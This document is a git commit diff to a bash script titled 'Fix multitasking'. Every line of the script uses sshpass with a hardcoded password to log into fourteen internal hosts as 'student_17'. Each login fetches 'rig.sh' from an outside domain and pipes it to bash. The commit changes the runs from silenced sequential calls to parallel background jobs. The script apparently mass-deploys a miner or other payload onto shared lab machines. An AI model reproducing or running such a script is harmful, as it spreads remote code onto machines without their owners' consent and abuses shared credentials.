39347b39d3cc4a03cb1726052390409480658661
ivanhi0 <idbod@ivanhi0.ru>
2026-04-15 10:23:19 +0300

    Fix multitasking

--- sch.sh
+++ sch.sh
@@ -1,16 +1,16 @@
 #!/bin/bash
 
-sshpass -p 10001 ssh student_17@172.29.217.15 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" > /dev/null 2>&1
-sshpass -p 10001 ssh student_17@172.29.217.16 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" > /dev/null 2>&1
-sshpass -p 10001 ssh student_17@172.29.217.35 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" > /dev/null 2>&1
-sshpass -p 10001 ssh student_17@172.29.217.36 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" > /dev/null 2>&1
-sshpass -p 10001 ssh student_17@172.29.217.37 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" > /dev/null 2>&1
-sshpass -p 10001 ssh student_17@172.29.217.38 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" > /dev/null 2>&1
-sshpass -p 10001 ssh student_17@172.29.217.40 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" > /dev/null 2>&1
-sshpass -p 10001 ssh student_17@172.29.217.41 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" > /dev/null 2>&1
-sshpass -p 10001 ssh student_17@172.29.217.154 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" > /dev/null 2>&1
-sshpass -p 10001 ssh student_17@172.29.217.178 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" > /dev/null 2>&1
-sshpass -p 10001 ssh student_17@172.29.217.183 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" > /dev/null 2>&1
-sshpass -p 10001 ssh student_17@172.29.217.190 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" > /dev/null 2>&1
-sshpass -p 10001 ssh student_17@172.29.217.199 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" > /dev/null 2>&1
-sshpass -p 10001 ssh student_17@172.29.217.200 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" > /dev/null 2>&1
+sshpass -p 10001 ssh student_17@172.29.217.15 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.16 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.35 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.36 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.37 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.38 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.40 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.41 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.154 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.178 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.183 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.190 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.199 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
+sshpass -p 10001 ssh student_17@172.29.217.200 "curl -sSL https://bio.ivanhi0.ru/rig.sh | bash" &
